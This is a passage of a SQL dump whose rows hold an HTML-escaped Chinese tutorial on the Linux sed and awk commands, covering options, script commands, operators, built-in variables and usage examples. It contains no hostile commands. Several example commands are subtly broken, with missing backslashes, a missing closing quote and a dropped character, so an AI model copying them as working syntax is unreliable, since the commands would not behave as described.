/&gt;&lt;/p&gt;&lt;p&gt;-e script &amp;nbsp; 要执行的脚本命令&lt;/p&gt;&lt;p&gt;-f file &amp;nbsp; 要执行的脚本命令文件，如果是大量脚本，你可以将他们写入一个文件然后用-f指定该文件作为要执行的命令&lt;/p&gt;&lt;p&gt;-i[suffix] &amp;nbsp; 就地编辑文件，如果指定了后缀[suffix]，则备份源文件&lt;/p&gt;&lt;p&gt;-l N &amp;nbsp; 指定要编辑的行，可指定多行，如1,3表示1 2 3行&lt;br /&gt;&lt;/p&gt;&lt;p&gt;--posix &amp;nbsp; 禁用所有GUN扩展&lt;/p&gt;&lt;p&gt;-r &amp;nbsp; 在脚本命令中使用扩展正则表达式&lt;/p&gt;&lt;p&gt;-s &amp;nbsp; 将同时处理的多个文件分开，而不是将他们作为一个整体的长数据流&lt;/p&gt;&lt;p&gt;-u &amp;nbsp; 从输入文件导入最小少的数据，更频繁的刷新输出缓存&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;script脚本命令&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;a &amp;nbsp; 在当前行后面加入一行文本&lt;/p&gt;&lt;p&gt;b lable &amp;nbsp; 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾&lt;/p&gt;&lt;p&gt;c &amp;nbsp; 用新的文本改变本行的文本&lt;/p&gt;&lt;p&gt;d &amp;nbsp; 从模板块（Pattern space）位置删除行&lt;/p&gt;&lt;p&gt;D &amp;nbsp;删除模板块的第一行&lt;/p&gt;&lt;p&gt;i &amp;nbsp; 在当前行上面插入文本&lt;/p&gt;&lt;p&gt;h &amp;nbsp; 拷贝模板块的内容到内存中的缓冲区&lt;/p&gt;&lt;p&gt;H &amp;nbsp;追加模板块的内容到内存中的缓冲区&lt;/p&gt;&lt;p&gt;g &amp;nbsp; 获得内存缓冲区的内容，并替代当前模板块中的文本&lt;/p&gt;&lt;p&gt;G &amp;nbsp;获得内存缓冲区的内容，并追加到当前模板块文本的后面&lt;/p&gt;&lt;p&gt;l &amp;nbsp; 列表不能打印字符的清单&lt;/p&gt;&lt;p&gt;n &amp;nbsp;读取下一个输入行，用下一个命令处理新的行而不是用第一个命令&lt;/p&gt;&lt;p&gt;N &amp;nbsp;追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。&lt;/p&gt;&lt;p&gt;p &amp;nbsp; 打印模板块的行&lt;/p&gt;&lt;p&gt;P &amp;nbsp;打印模板块的第一行&lt;/p&gt;&lt;p&gt;q &amp;nbsp;退出Sed&lt;/p&gt;&lt;p&gt;r file &amp;nbsp; 从file中读行&lt;/p&gt;&lt;p&gt;w file &amp;nbsp; 写并追加模板块到file末尾&lt;/p&gt;&lt;p&gt;W file &amp;nbsp; 写并追加模板块的第一行到file末尾。&lt;/p&gt;&lt;p&gt;t label &amp;nbsp; if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾&lt;/p&gt;&lt;p&gt;T label &amp;nbsp; 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾&lt;/p&gt;&lt;p&gt;! &amp;nbsp; 表示后面的命令对所有没有被选定的行发生作用&lt;/p&gt;&lt;p&gt;s/re/string &amp;nbsp; 用string替换正则表达式re&lt;/p&gt;&lt;p&gt;= &amp;nbsp; 打印当前行号码&lt;/p&gt;&lt;p&gt;# &amp;nbsp; 把注释扩展到下一个换行符以前&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc00&quot;&gt;以下的是替换标记：&lt;/span&gt;&lt;br /&gt;* g 表示行内全面替换&lt;br /&gt;* p 表示打印行&lt;br /&gt;* w 表示把行写入一个文件&lt;br /&gt;* x 表示互换模板块中的文本和缓冲区中的文本&lt;br /&gt;* y 表示把一个字符翻译为另外的字符（但是不用于正则表达式）&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;元字符集参考：&lt;/span&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7346811&quot;&gt;http://blog.csdn.net/luochuan/article/details/7346811&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0c0c0c;&quot;&gt;将sed.ini文件中以Well开始的行后面添加 end;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0c0c0c;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/^Well/a end;&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;删除sed.ini文件的第7行到末尾的内容&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;7,$d&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;删除sed.ini中所有包含this的行&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/d&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#0c0c0c;&quot;&gt;&lt;/span&gt;将sed.ini文件中的this替换成that&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;s/this/that/g&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini文件中以Well开始的行的Well替换成Ok，并只打印匹配到的行&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -n -e &#039;s/^Well/Ok/p&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini文件中的loveable替换成lovers&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;s/(love)able/1rs/g&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;多点编辑命令-e&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;将sed.ini文件中Well开始的行的Well替换成Ok，并且将行内的here后面加this&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;s/^Well/Ok/g&#039; -e &#039;/here/a this&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;读取sed.php中的内容并显示在sed.ini中所有以this开始的行后面&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/^this/r /etc/sed.php&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini中所有包含php的行写入到sed.php文件中&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/php/w /etc/sed.php&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将---插入包含this的行前面&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/i---&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini中包含this的行放到缓冲区并删除该行，然后将包含that的行用缓冲区的内容替换掉&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/{h;d}&#039; -e &#039;/that/{p;x}&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini中包含this的行放到缓冲区，然后将其添加到包含that的行后&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/{h;d}&#039; -e &#039;/that/G&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini中包含this的行的下一行中的that替换成this&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/{n;s/that/this/} /etc/php.ini&lt;/pre&gt;&lt;p&gt;打印sed.ini的内容直到第5行然后退出&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;5q&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;打印sed.ini并显示行号&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;=&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;将sed.ini文件中包含this的行用the new words替换&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -e &#039;/this/c    he new words&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;打印sed.ini文件的第二行&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;sed -n -e &#039;2p&#039; /etc/sed.ini&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387347856);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(38, 38, '&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/209681.htm&quot;&gt;百度百科&lt;/a&gt;：&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;AWK是一种优良的文本处理工具。它不仅是 Linux 中也是任何环境中现有的功能最强大的数据处理引擎之一。这种编程及数据操作语言（其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母）的最大功能取决于一个人所拥有的知识。AWK 提供了极其强大的功能：可以进行样式装入、流控制、数学运算符、进程控制语句甚至于内置的变量和函数。它具备了一个完整的语言所应具有的几乎所有精美特性。实际上 AWK 的确拥有自己的语言：AWK 程序设计语言， 三位创建者已将它正式定义为&ldquo;样式扫描和处理语言&rdquo;。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。&lt;/p&gt;&lt;p&gt;　　最简单地说， AWK 是一种用于处理文本的编程语言工具。AWK 在很多方面类似于 shell 编程语言，尽管 AWK 具有完全属于其本身的语法。它的设计思想来源于 SNOBOL4 、sed 、Marc Rochkind设计的有效性语言、语言工具 yacc 和 lex ，当然还从 C 语言中获取了一些优秀的思想。在最初创造 AWK 时，其目的是用于文本处理，并且这种语言的基础是，只要在输入数据中有模式匹配，就执行一系列指令。该实用工具扫描文件中的每一行，查找与命令行中所给定内容相匹配的模式。如果发现匹配内容，则进行下一个编程步骤。如果找不到匹配内容，则继续处理下一行。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;命令格式： awk [options] &amp;#39;script&amp;#39; var=value file(s) &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; awk [options] -f scriptfile var=value file(s)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;options命令选项&lt;/strong&gt;&lt;/span&gt;&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-F fs or --field-separator fs&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;term&quot;&gt;&lt;/span&gt;指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-v var=value or --asign var=value&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;赋值一个用户定义变量&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-f scripfile or --file scriptfile&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;从脚本文件中读取awk命令。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-mf nnn and -mr nnn&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W compact or --compat, &lt;/span&gt;&lt;span class=&quot;term&quot;&gt;-W traditional or --traditional&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W copyleft or --copyleft, &lt;/span&gt;&lt;span class=&quot;term&quot;&gt;-W copyright or --copyright&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印简短的版权信息。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W help or --help, &lt;/span&gt;&lt;span class=&quot;term&quot;&gt;-W usage or --usage&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印全部awk选项和每个选项的简短说明。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W lint or --lint&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印不能向传统unix平台移植的结构的警告。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W lint-old or --lint-old&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印关于不能向传统unix平台移植的结构的警告。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W posix&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打开兼容模式。但有以下限制，不识别：x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符**和**=不能代替^和^=；fflush无效。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W re-interval or --re-inerval&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W source program-text or --source program-text&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;使用program-text作为源代码，可与-f命令混用。&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span class=&quot;term&quot;&gt;-W version or --version&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印bug报告信息的版本。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;模式和操作&lt;/strong&gt;&lt;/span&gt;&lt;span class=&quot;term&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;term&quot;&gt;awk脚本是由模式和操作组成的：&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;pattern {action} 如$ awk &amp;#39;/root/&amp;#39; test，或$ awk &amp;#39;$3 &amp;lt; 100&amp;#39; test&lt;/span&gt;&lt;/p&gt;&lt;p&gt;两者是可选的，如果没有模式，则action应用到全部记录，如果没有action，则输出匹配全部记录。默认情况下，每一个输入行都是一条记录，但用户可通过RS变量指定不同的分隔符进行分隔。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:12px&quot;&gt;模式&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;模式可以是以下任意一个：&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;/正则表达式/：使用通配符的扩展集。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;关系表达式：可以用下面运算符表中的关系运算符进行操作，可以是字符串或数字的比较，如$2&amp;gt;%1选择第二个字段比第一个字段长的行。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;模式匹配表达式：用运算符~(匹配)和~!(不匹配)。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;模式，模式：指定一个行的范围。该语法不能包括BEGIN和END模式。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;BEGIN：让用户指定在第一条输入记录被处理之前所发生的动作，通常可在这里设置全局变量。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;END：让用户在最后一条输入记录被读取之后发生的动作。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:12px;color:#cc0000&quot;&gt;&lt;strong&gt;操作&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;操作由一人或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内。主要有四部份：&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;变量或数组赋值&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;输出命令&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;内置函数&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;控制流命令&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;环境变量&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;ARGC &amp;nbsp; &amp;nbsp;命令行变元个数&lt;br /&gt;ARGV &amp;nbsp; &amp;nbsp;命令行变元数组&lt;br /&gt;FILENAME &amp;nbsp; 当前输入文件名&lt;br /&gt;FNR &amp;nbsp; &amp;nbsp; &amp;nbsp;当前文件中的记录号&lt;br /&gt;FS &amp;nbsp; 输入域分隔符，默认为一个空格&lt;br /&gt;RS &amp;nbsp; 输入记录分隔符&lt;br /&gt;NF &amp;nbsp; 当前记录里域个数&lt;br /&gt;NR &amp;nbsp; 到目前为止记录数&lt;br /&gt;OFS &amp;nbsp; 输出域分隔符&lt;br /&gt;ORS &amp;nbsp; 输出记录分隔符&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;运算符&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;= += -= *= /= %= ^= **= &amp;nbsp; &amp;nbsp;赋值&lt;br /&gt;?: &amp;nbsp; &amp;nbsp;C条件表达式&lt;br /&gt;|| &amp;nbsp; &amp;nbsp; 逻辑或&lt;br /&gt;&amp;amp;&amp;amp; &amp;nbsp; &amp;nbsp; 逻辑与&lt;br /&gt;~ ~! &amp;nbsp; &amp;nbsp;匹配正则表达式和不匹配正则表达式&lt;br /&gt;&amp;lt; &amp;lt;= &amp;gt; &amp;gt;= != == &amp;nbsp; &amp;nbsp;关系运算符&lt;br /&gt;空格 &amp;nbsp; &amp;nbsp;连接&lt;br /&gt;+ - &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;加，减&lt;br /&gt;* / &amp;amp; &amp;nbsp; &amp;nbsp; 乘，除与求余&lt;br /&gt;+ - ! &amp;nbsp; &amp;nbsp; 一元加，减和逻辑非&lt;br /&gt;^ *** &amp;nbsp; &amp;nbsp;求幂&lt;br /&gt;++ -- &amp;nbsp; &amp;nbsp;增加或减少，作为前缀或后缀&lt;br /&gt;$ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;字段引用&lt;br /&gt;in &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 数组成员&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;例子&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;范围模板匹配从第一个模板的第一次出现到第二个模板的第一次出现之间所有行。如果有一个模板没出现，则匹配到开头或末尾。如$ awk &amp;#39;/root/,/mysql/&amp;#39; test将显示root第一次出现到mysql第一次出现之间的所有行。&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;/101/&amp;#39; &amp;nbsp;file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;显示file中包含101的匹配行&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;/101/,/105/&amp;#39; &amp;nbsp;file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;显示file中在101和105之间的内容&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;$1 == 5&amp;#39; &amp;nbsp;file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;匹配file中第一列是5的所有行&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;$1 == &amp;quot;CT&amp;quot;&amp;#39; file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;匹配file中第一个列域是CT的所有行 &lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk -F &amp;quot;|&amp;quot; &amp;#39;{print $1}&amp;#39; &amp;nbsp; file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;按照新的分隔符&ldquo;|&rdquo;作为列域分隔符对file进行操作&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;$2 &amp;gt;5 &amp;amp;&amp;amp; $2&amp;lt;=15&amp;#39; &amp;nbsp; &amp;nbsp; file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;匹配file中第二列大于5并且小于15的所有行&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk &amp;#39;{print NR,NF,$1,$NF,}&amp;#39; file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;显示文件file的当前记录号、域数和每一行的第一个和最后一个域&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;/101/ {print $1 $2}&amp;#39; file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;显示文件file的匹配行的第一、二个域，但显示时域中间没有分隔符&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;df | awk &amp;#39;$4&amp;gt;1000000 &amp;#39;&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;通过管道符|获得输入，如：显示第4个列域大于1000000的行&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;awk -f awkfile file&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;对file中的所有行依次执行awkfile中的命令&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;#39;$1 ~ /101/ {print $1}&amp;#39; file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;显示文件中第一个域匹配101的&lt;/span&gt;所有行&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;nbsp; &amp;#39;BEGIN { OFS=&amp;quot;%&amp;quot;} {print $1,$2}&amp;#39; file&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;通过设置输出分隔符（OFS=&amp;quot;%&amp;quot;）修改输出格式，打印每一行的前两个列域&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;awk编程&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span id=&quot;zoom&quot; class=&quot;f14&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;awk &amp;nbsp; &amp;#39;BEGIN { max=100 ;print &amp;quot;max=&amp;quot; max} &amp;nbsp; {max=($1 &amp;gt;max ?$1:max); print $1,&amp;quot;Now max is &amp;quot;max}&amp;#39; &amp;nbsp;file&lt;/span&gt;&lt;br 